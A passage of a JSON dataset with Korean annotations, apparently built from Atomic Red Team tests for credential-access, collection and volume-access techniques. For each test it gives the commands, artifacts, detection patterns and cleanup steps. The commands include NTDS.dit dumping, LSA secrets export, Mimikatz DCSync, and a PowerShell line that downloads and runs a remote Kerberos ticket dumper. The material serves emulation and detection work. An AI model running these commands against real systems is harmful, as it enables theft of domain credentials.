            "description": "볼륨 섀도 카피에서 복사한 Active Directory 데이터베이스"
          },
          {
            "path": "#{extract_path}\\VSC_SYSTEM_HIVE",
            "description": "볼륨 섀도 카피에서 복사한 SYSTEM 하이브"
          },
          {
            "path": "#{extract_path}\\SYSTEM_HIVE",
            "description": "현재 HKLM\\SYSTEM에서 저장한 SYSTEM 하이브"
          }
        ],
        "files_read": [
          {
            "path": "#{vsc_name}\\Windows\\NTDS\\NTDS.dit",
            "description": "섀도 카피 상의 원본 NTDS 데이터베이스"
          },
          {
            "path": "#{vsc_name}\\Windows\\System32\\config\\SYSTEM",
            "description": "섀도 카피 상의 SYSTEM 하이브"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM",
            "description": "부트키 및 도메인 계정 해시 복호화에 필요한 시스템 구성 정보"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe / copy",
            "description": "섀도 카피 경로에서 NTDS.dit와 SYSTEM 하이브를 로컬 경로로 복사",
            "commandline_pattern": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\*"
          },
          {
            "name": "reg.exe",
            "description": "HKLM\\SYSTEM 하이브를 파일로 저장",
            "commandline_pattern": "reg save HKLM\\SYSTEM *SYSTEM_HIVE"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["file_copy", "registry_export"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-3",
      "name": "Dump Active Directory Database with NTDSUtil",
      "platforms": ["windows"],
      "summary": "도메인 컨트롤러에서 NTDSUtil의 IFM(Install From Media) 기능을 사용해 ntds.dit를 오프라인 백업 형태로 덤프한다. 지정 폴더에 AD 데이터베이스 복사본이 생성된다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "mkdir #{output_folder}\r\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{output_folder}",
            "description": "NTDSUtil IFM 백업이 저장된 폴더(내부에 ntds.dit 및 관련 파일 존재)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "ntdsutil.exe",
            "description": "IFM 기능으로 NTDS 데이터베이스를 디스크로 덤프",
            "commandline_pattern": "ntdsutil \"ac i ntds\" \"ifm\" \"create full *"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "database_backup"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump"]
      }
    },
    {
      "test_id": "T1003.003-4",
      "name": "Create Volume Shadow Copy with WMI",
      "platforms": ["windows"],
      "summary": "도메인 컨트롤러에서 WMI(wmic shadowcopy)를 사용해 지정 드라이브에 볼륨 섀도 카피를 생성한다. vssadmin 대신 WMI 인터페이스를 활용하는 방식이다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wmic shadowcopy call create Volume=#{drive_letter}"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "Win32_ShadowCopy 클래스 호출로 섀도 카피 생성",
            "commandline_pattern": "wmic shadowcopy call create Volume=*"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-5",
      "name": "Create Volume Shadow Copy remotely with WMI",
      "platforms": ["windows"],
      "summary": "도메인 관리자 권한이 있는 원격 워크스테이션에서 WMI 원격 호출(wmic /node)을 사용해 대상 도메인 컨트롤러에 볼륨 섀도 카피를 생성한다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "원격 노드(target_host)에서 섀도 카피 생성 요청",
            "commandline_pattern": "wmic /node:* shadowcopy call create Volume=*"
          }
        ],
        "network": [
          {
            "description": "원격 도메인 컨트롤러(target_host)와의 WMI(RPC/DCOM) 통신"
          }
        ]
      },
      "tags": {
        "action": ["process_start", "remote_execution", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "Remote_WMI"]
      }
    },
    {
      "test_id": "T1003.003-6",
      "name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
      "platforms": ["windows"],
      "summary": "원격 WMI를 사용해 대상 도메인 컨트롤러에서 cmd.exe /c esentutl.exe /y /vss 를 실행시켜 NTDS.dit를 스냅샷에서 바로 지정 경로로 복사한다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\""
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{target_path}",
            "description": "대상 호스트에서 esentutl.exe를 통해 복사된 NTDS.dit 파일"
          }
        ],
        "files_read": [
          {
            "path": "#{source_path}",
            "description": "섀도 카피 또는 원본 경로의 NTDS.dit 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "원격 프로세스(cmd.exe / esentutl.exe) 생성을 요청하는 WMI 클라이언트",
            "commandline_pattern": "wmic /node:* process call create \"cmd.exe /c esentutl.exe /y /vss *"
          },
          {
            "name": "esentutl.exe",
            "description": "대상 호스트에서 NTDS.dit를 VSS 기반으로 복사",
            "commandline_pattern": "esentutl.exe /y /vss *ntds.dit*"
          }
        ],
        "network": [
          {
            "description": "원격 WMI/RPC 통신을 통한 프로세스 생성 및 제어"
          }
        ]
      },
      "tags": {
        "action": ["remote_execution", "file_copy", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "Remote_WMI", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-7",
      "name": "Create Volume Shadow Copy with Powershell",
      "platforms": ["windows"],
      "summary": "PowerShell에서 WMI 클래스를 직접 호출해 win32_shadowcopy.Create를 실행하고, 지정 드라이브에 ClientAccessible 유형의 섀도 카피를 생성한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WMI(win32_shadowcopy)를 사용해 섀도 카피 생성",
            "commandline_pattern": "win32_shadowcopy).Create('*','ClientAccessible')"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-8",
      "name": "Create Symlink to Volume Shadow Copy",
      "platforms": ["windows"],
      "summary": "vssadmin으로 섀도 카피를 생성한 뒤 mklink /D를 사용해 해당 섀도 카피 경로를 가리키는 디렉터리 심볼릭 링크를 만든다. 이를 통해 일반 경로처럼 VSS 내용을 탐색·복사할 수 있다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "vssadmin.exe create shadow /for=#{drive_letter}\r\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{symlink_path}",
            "description": "HarddiskVolumeShadowCopy1을 가리키는 디렉터리 심볼릭 링크"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "vssadmin.exe",
            "description": "섀도 카피 생성",
            "commandline_pattern": "vssadmin.exe create shadow /for=*"
          },
          {
            "name": "cmd.exe / mklink",
            "description": "섀도 카피 디바이스 경로를 대상으로 디렉터리 심볼릭 링크 생성",
            "commandline_pattern": "mklink /D *HarddiskVolumeShadowCopy1"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "vss_access", "symlink_create"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    },
    {
      "test_id": "T1003.003-9",
      "name": "Create Volume Shadow Copy with diskshadow",
      "platforms": ["windows"],
      "summary": "diskshadow.exe 스크립트 파일을 사용해 볼륨 섀도 카피를 생성하고 c:\\exfil 폴더 등으로 NTDS.dit를 추출하는 데 사용할 수 있는 환경을 만든다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "mkdir c:\\exfil\r\ndiskshadow.exe /s #{filename}"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "c:\\exfil",
            "description": "diskshadow 스크립트에서 NTDS.dit 등을 저장하는 데 사용될 수 있는 폴더"
          },
          {
            "path": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt",
            "description": "diskshadow 명령을 포함하는 스크립트 파일(기본값 filename)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt",
            "description": "/s 옵션으로 diskshadow.exe가 읽는 스크립트"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "diskshadow.exe",
            "description": "스크립트 기반으로 VSS 스냅샷을 생성하고 복사 작업 수행",
            "commandline_pattern": "diskshadow.exe /s *diskshadow.txt"
          }
        ],
        "network": []
      },
      "tags": {
        "action": ["process_start", "vss_access"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
      }
    }
  ]
},
{
  "technique_id": "T1003.004",
  "technique_name": "OS Credential Dumping: LSA Secrets",
  "tactic": "Credential Access",
  "description": "윈도우 LSA(현지 보안 기관)가 레지스트리에 저장하는 LSA Secrets 영역을 덤프해 서비스 계정, 캐시된 자격 증명, Kerberos 티켓 등의 민감 정보를 추출하는 기법이다.",
  "tests": [
    {
      "test_id": "T1003.004-1",
      "name": "Dumping LSA Secrets",
      "platforms": ["windows"],
      "summary": "PsExec를 SYSTEM 권한으로 실행해 HKLM\\security\\policy\\secrets 하위 키를 reg save로 %temp%\\secrets 파일로 덤프하는 시나리오다.",
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
        }
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%temp%\\secrets",
            "description": "HKLM\\security\\policy\\secrets 키가 저장된 LSA Secrets 덤프 파일"
          }
        ],
        "files_read": [
          {
            "path": "HKLM\\security\\policy\\secrets",
            "description": "LSA Secrets가 저장된 레지스트리 위치"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\security\\policy\\secrets",
            "description": "LSA Secrets (서비스 계정, 기타 보안 정보) 저장 영역"
          }
        ],
        "processes": [
          {
            "name": "PsExec.exe",
            "description": "SYSTEM 권한으로 reg save를 실행하는 Sysinternals 도구",
            "commandline_pattern": "PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets *"
          },
          {
            "name": "reg.exe",
            "description": "LSA Secrets 레지스트리 키를 파일로 저장",
            "commandline_pattern": "reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
          }
        ],
        "network": [
          {
            "description": "사전 준비 단계에서 Sysinternals PSTools.zip을 다운로드하기 위한 HTTP/HTTPS 트래픽"
          }
        ]
      },
      "cleanup": [
        "%temp%\\secrets 파일을 삭제해 LSA Secrets 덤프 흔적을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "55295ab0-a703-433b-9ca4-ae13807de12f",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1003/004/",
          "https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.004"
        ]
      },
      "tags": {
        "action": ["process_start", "registry_export", "file_create"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "LSA_Secrets_Dump"]
      }
    },
    {
      "test_id": "T1003.004-2",
      "name": "Dump Kerberos Tickets from LSA using dumper.ps1",
      "platforms": ["windows"],
      "summary": "PowershellKerberos의 dumper.ps1을 원격에서 로드해 LSA 캐시에서 Kerberos 티켓을 덤프한다. 관리자 권한일 경우 자동으로 SYSTEM 권한으로 승격해 모든 세션 티켓을 수집한다.",
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')"
        }
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "원격 GitHub에서 dumper.ps1을 다운로드·실행해 Kerberos 티켓을 덤프",
            "commandline_pattern": "DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/*/dumper.ps1')"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 dumper.ps1 스크립트를 다운로드하는 HTTP/HTTPS 트래픽"
          }
        ]
      },
      "cleanup": [
        "메모리 기반 실행이므로 별도 아티팩트는 적지만, 명령 기록(PowerShell 로그, 프록시/방화벽 로그)로 행위 추적이 가능하다."
      ],
      "metadata": {
        "atomic_source_id": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1003/004/",
          "https://github.com/MzHmO/PowershellKerberos/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.004"
        ]
      },
      "tags": {
        "action": ["script_download", "process_start", "ticket_dump"],
        "domain": ["CredentialAccess"],
        "ttp": ["OS_Credential_Dumping", "Kerberos_Ticket_Dump"]
      }
    }
  ]
},
{
  "technique_id": "T1003.005",
  "technique_name": "OS Credential Dumping: Cached Domain Credentials",
  "tactic": "Credential Access",
  "description": "도메인 환경에서 사용자의 캐시된 도메인 자격 증명(로그온 시 로컬에 저장된 크리덴셜)을 악용·열람해 추가 시스템이나 서비스로의 횡적 이동에 사용하는 기법이다. 이 테스트는 cmdkey.exe를 통해 현재 사용자 컨텍스트에 저장된 인증 정보를 나열하는 행위를 모사한다.",
  "tests": [
    {
      "test_id": "T1003.005-1",
      "name": "Cached Credential Dump via Cmdkey",
      "platforms": [
        "windows"
      ],
      "summary": "내장 유틸리티 cmdkey.exe를 사용해 현재 사용자 프로파일에 저장된 캐시 자격 증명 목록을 나열한다. 암호 값은 표시되지 않지만 대상, 사용자 이름 등 연결에 사용할 수 있는 메타데이터를 수집할 수 있다.",
      "procedure": [
        "명령 프롬프트 또는 PowerShell에서 cmdkey /list를 실행한다.",
        "출력에 표시되는 대상(서버/리소스)과 저장된 사용자 이름 정보를 확인하고, 추가 공격(재사용 가능 계정, RDP/SMB 연결 등)에 활용할 수 있는지 분석한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "cmdkey /list"
        }
      ],
      "prerequisites": [
        "테스트를 수행하는 계정 프로파일에 하나 이상 저장된 자격 증명이 존재해야 의미 있는 출력이 생성된다.",
        "cmdkey.exe(Windows 내장 도구)가 기본 경로(C:\\Windows\\System32)에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmdkey.exe",
            "description": "현재 사용자 컨텍스트의 저장된 자격 증명 목록을 나열하는 윈도우 내장 유틸리티",
            "commandline_pattern": "cmdkey /list"
          }
        ],
        "network": []
      },
      "cleanup": [
        "cmdkey /list는 조회만 수행하며 별도의 파일·레지스트리 변경이 없으므로 정리 단계는 필요하지 않다.",
        "단, 포렌식 관점에서는 프로세스 실행 흔적(프로세스 생성 로그, 명령줄 로깅, 콘솔 히스토리 등)을 통해 행위를 추적할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "56506854-89d6-46a3-9804-b7fde90791f9",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1003/005/",
          "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey",
          "https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.005"
        ]
      },
      "tags": {
        "action": [
          "process_start",
          "credential_enumeration"
        ],
        "domain": [
          "CredentialAccess"
        ],
        "ttp": [
          "OS_Credential_Dumping",
          "Cached_Domain_Credentials_Enum"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1003.006",
  "technique_name": "OS Credential Dumping: DCSync",
  "tactic": "Credential Access",
  "description": "DCSync는 공격자가 도메인 컨트롤러(DC)처럼 행동하며 도메인 복제(Directory Replication Service) 프로토콜을 악용해 계정 해시와 비밀 정보를 원격으로 요청·획득하는 기법이다. NTDS.dit를 직접 복사하거나 메모리를 덤프하지 않고도 krbtgt 계정 등 핵심 크리덴셜을 탈취할 수 있어 도메인 관리자 계정 탈취, 골든 티켓 생성 등으로 이어질 수 있다.",
  "tests": [
    {
      "test_id": "T1003.006-1",
      "name": "DCSync (Active Directory)",
      "platforms": [
        "windows"
      ],
      "summary": "Mimikatz lsadump::dcsync 모듈을 사용해 도메인 복제 프로토콜을 통해 원격 도메인 컨트롤러에서 대상 사용자(기본 krbtgt)의 계정 정보를 요청·덤프하는 시나리오이다.",
      "procedure": [
        "도메인 관리자 또는 동급 권한(복제 권한 포함)을 가진 계정 컨텍스트에서 Mimikatz 실행 파일을 준비한다.",
        "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain} 명령을 사용해 도메인 컨트롤러에 복제 요청을 보내고, 해시·비밀 정보를 포함한 계정 데이터를 수신한다.",
        "결과로 출력된 NTLM 해시, Kerberos 관련 값 등을 후속 공격(골든 티켓, 패스더해시 등)에 활용할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\""
        }
      ],
      "prerequisites": [
        "mimikatz.exe가 #{mimikatz_path} 위치에 존재해야 한다.",
        "현재 사용자 계정이 도메인 관리자, 도메인 컨트롤러 계정 또는 복제 권한이 부여된 계정이어야 한다.",
        "대상 도메인 컨트롤러에 네트워크로 접근 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "mimikatz.exe",
            "description": "lsadump::dcsync 모듈을 통해 도메인 복제 프로토콜을 악용해 계정 정보를 덤프하는 도구",
            "commandline_pattern": "*lsadump::dcsync /domain:* /user:*@*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러와의 AD 복제 트래픽(DS-RPC/LSARPC 등)을 통해 계정 데이터를 요청·수신하는 네트워크 통신"
          }
        ]
      },
      "cleanup": [
        "로컬 디스크에는 기본적으로 별도 파일이 생성되지 않지만, 콘솔 로그·이벤트 로그·네트워크 로그에 흔적이 남을 수 있다.",
        "포렌식·탐지 관점에서는 프로세스 생성 이벤트, 명령줄 로깅, DC 보안 로그(Directory Service 로그)에서 DCSync 관련 이벤트를 모니터링할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1003/006/",
          "https://adsecurity.org/?p=1729",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.006"
        ]
      },
      "tags": {
        "action": [
          "process_start",
          "directory_replication",
          "credential_dump"
        ],
        "domain": [
          "CredentialAccess"
        ],
        "ttp": [
          "OS_Credential_Dumping",
          "DCSync",
          "AD_Repl_Abuse"
        ]
      }
    },
    {
      "test_id": "T1003.006-2",
      "name": "Run DSInternals Get-ADReplAccount",
      "platforms": [
        "windows"
      ],
      "summary": "DSInternals 모듈의 Get-ADReplAccount cmdlet을 사용해 도메인 컨트롤러(기본 %LOGONSERVER%)로부터 AD 복제 계정 정보를 조회·덤프하는 시나리오이다.",
      "procedure": [
        "PowerShell 환경에 DSInternals 모듈이 설치되어 있어야 한다.",
        "Get-ADReplAccount -All -Server #{logonserver} 명령을 실행해 대상 도메인 컨트롤러에서 모든 계정의 복제 정보를 조회한다.",
        "표준 출력에 표시되는 도메인 이름, 계정 정보, 해시 관련 데이터 등을 확인하고 추가 공격에 활용할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADReplAccount -All -Server #{logonserver}"
        }
      ],
      "prerequisites": [
        "PowerShell 환경에 DSInternals 모듈이 설치되어 있어야 한다(Install-Module -Name DSInternals 등).",
        "도메인 컨트롤러(#{logonserver})에 대해 AD 복제 정보를 조회할 수 있는 권한이 필요하다.",
        "도메인 컨트롤러와의 네트워크 연결이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "DSInternals 모듈을 사용해 AD 복제 계정 정보를 조회하는 PowerShell 프로세스",
            "commandline_pattern": "Get-ADReplAccount -All -Server *"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러(#{logonserver})와의 LDAP/LDAPS 및 RPC 기반 AD 복제 정보 조회 트래픽"
          }
        ]
      },
      "cleanup": [
        "기본 테스트는 파일을 남기지 않고 표준 출력으로만 결과를 표시하므로 별도 정리 작업은 필요 없다.",
        "다만 PowerShell 로그, 도메인 컨트롤러 보안 로그, 네트워크 로그에 쿼리 흔적이 남을 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1003/006/",
          "https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/",
          "https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.006"
        ]
      },
      "tags": {
        "action": [
          "process_start",
          "directory_replication",
          "credential_enum"
        ],
        "domain": [
          "CredentialAccess"
        ],
        "ttp": [
          "OS_Credential_Dumping",
          "DCSync",
          "AD_Repl_Abuse"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1005",
  "technique_name": "Data from Local System",
  "tactic": "Collection",
  "description": "이 기법은 로컬 시스템 내 사용자 디렉터리, 문서 폴더 등에서 민감한 파일(문서, 텍스트 등)을 찾아 수집하는 행위다. 공격자는 특정 확장자를 가진 파일만 선별 검색한 뒤, 추후 유출을 위해 하나의 압축 파일로 묶어두는 등 사전 준비(컬렉션)를 수행한다. 일반 사용자 활동과 구분이 어려워 파일 접근 패턴, 압축 생성 시점, 경로 등을 종합적으로 분석해야 한다.",
  "tests": [
    {
      "test_id": "T1005-1",
      "name": "Search files of interest and save them to a single zip file (Windows)",
      "platforms": [
        "windows"
      ],
      "summary": "지정한 시작 디렉터리(기본 C:\\Users) 아래에서 특정 확장자(.doc, .docx, .txt) 파일만 재귀적으로 검색하고, 발견된 파일들을 하나의 ZIP 파일로 묶어 저장한다. 공격자가 로컬 문서들을 선별 수집해 이후 유출을 준비하는 전형적인 시나리오를 에뮬레이션한다.",
      "procedure": [
        "시작 디렉터리(starting_directory)와 출력 폴더(output_zip_folder_path), 검색 대상 확장자 목록(file_extensions)을 설정한다.",
        "출력 폴더가 존재하지 않으면 PowerShell New-Item으로 생성한다.",
        "Get-ChildItem -Recurse로 시작 디렉터리 아래 모든 파일을 나열한 뒤, 확장자가 지정된 목록에 포함되는 파일만 필터링한다.",
        "필터링된 파일이 하나 이상이면 Compress-Archive를 사용해 모두 data.zip 하나로 압축한다.",
        "압축이 생성되면 경로를 출력하고, 대상 파일이 없으면 \"No files found\" 메시지를 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$startingDirectory = \"#{starting_directory}\";\n$outputZip = \"#{output_zip_folder_path}\";\n$fileExtensionsString = \"#{file_extensions}\";\n$fileExtensions = $fileExtensionsString -split \", \";\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null;\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  };\n  return $files;\n}\n\n$foundFiles = Search-Files -directory $startingDirectory;\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName;\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";\n  Write-Host \"Zip file created: $outputZip\\data.zip\";\n} else {\n  Write-Host \"No files found with the specified extensions.\";\n}"
        }
      ],
      "prerequisites": [
        "starting_directory 경로에 접근 가능한 권한이 있어야 한다 (기본값은 C:\\Users).",
        "PowerShell 환경에서 Compress-Archive 및 Get-ChildItem -Recurse 사용이 가능해야 한다.",
        "output_zip_folder_path에 폴더를 생성하고 data.zip을 쓸 수 있는 쓰기 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\\data.zip",
            "description": "지정된 확장자의 파일들을 하나로 묶어 저장한 ZIP 압축 파일"
          }
        ],
        "files_read": [
          {
            "path": "C:\\Users\\* (.doc, .docx, .txt 등)",
            "description": "사용자 프로필 하위의 문서·텍스트 파일들을 재귀적으로 열람하여 목록을 수집"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "파일 검색 및 Compress-Archive를 실행해 ZIP 파일을 생성하는 데 사용된 프로세스",
            "commandline_pattern": "Compress-Archive -Path * -DestinationPath *data.zip*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 종료 후 생성된 ZIP 파일(PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\\data.zip)을 삭제해 수집된 데이터 흔적을 제거할 수 있다."
      ],
      "tags": {
        "action": [
          "file_search",
          "file_read",
          "file_compress",
          "file_create"
        ],
        "domain": [
          "Collection",
          "Exfiltration_Preparation"
        ],
        "ttp": [
          "Data_From_Local_System"
        ]
      },
      "metadata": {
        "atomic_source_id": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1005/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1005"
        ]
      }
    }
  ]
},{
  "technique_id": "T1006",
  "technique_name": "Direct Volume Access",
  "tactic": "Defense Evasion",
  "description": "이 기법은 파일 시스템 계층을 우회하고 디스크 볼륨에 직접 접근하는 행위이다. 공격자는 \\\\.\\C: 와 같은 DOS 디바이스 경로를 사용해 부트 섹터나 파티션 영역을 직접 읽어 포렌식 도구를 우회하거나 숨겨진 데이터/부트킷을 확인할 수 있다. 보통 관리자 권한이 필요하며, 일반 파일 접근 로그만으로는 탐지하기 어렵기 때문에 로우 디스크 핸들 사용 여부 등을 별도 모니터링해야 한다.",
  "tests": [
    {
      "test_id": "T1006-1",
      "name": "Read volume boot sector via DOS device path (PowerShell)",
      "platforms": [
        "windows"
      ],
      "summary": "PowerShell에서 \\\\.\\ 디바이스 경로를 사용해 볼륨 핸들을 직접 열고, 첫 11바이트를 읽어 부트 섹터 내용을 HEX로 출력한다. NTFS 볼륨인 경우 \"EB 52 90 4E 54 46 53\"(NTFS 시그니처)이 확인될 수 있다.",
      "procedure": [
        "입력 인자 volume(기본 'C:') 값을 사용해 타깃 드라이브를 결정한다.",
        "PowerShell에서 IO.FileStream을 이용해 \"\\\\.\\#{volume}\" 경로로 볼륨 핸들을 연다.",
        "길이가 11인 바이트 배열 버퍼를 생성한 뒤, 볼륨의 처음 11바이트를 읽어 버퍼에 저장한다.",
        "핸들을 닫고, Format-Hex cmdlet으로 버퍼 내용을 헥스 덤프로 출력해 부트 섹터 시그니처를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length) | Out-Null; $handle.Close(); Format-Hex -InputObject $buffer"
        }
      ],
      "prerequisites": [
        "volume 인자로 지정된 드라이브 문자(예: 'C:')가 실제로 존재하고 온라인 상태여야 한다.",
        "로컬 관리자 권한 또는 해당 볼륨에 대한 로우 디스크 읽기 권한이 있는 PowerShell 세션에서 실행해야 한다.",
        "PowerShell 환경에 Format-Hex cmdlet(예: PowerShell 5 이상 또는 호환 모듈)이 사용 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [
          {
            "path": "\\\\.\\C:",
            "description": "테스트 시 디바이스 경로를 통해 직접 읽히는 NTFS 볼륨(기본값, 실제 실행 시 volume 인자 값으로 대체)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "IO.FileStream을 사용해 디스크 볼륨을 직접 열고 부트 섹터 일부를 읽어오는 데 사용된 프로세스",
            "commandline_pattern": "New-Object IO.FileStream \"\\\\.\\*\", 'Open', 'Read', 'ReadWrite'"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트는 디스크 내용을 읽기만 하므로 별도의 파일/레지스트리 클린업은 필요 없다.",
        "운영 환경에서는 디바이스 경로를 이용한 비정상적인 powershell.exe 사용 여부를 로깅·모니터링 항목에 포함할 수 있다."
      ],
      "tags": {
        "action": [
          "process_start",
          "raw_disk_read"
        ],
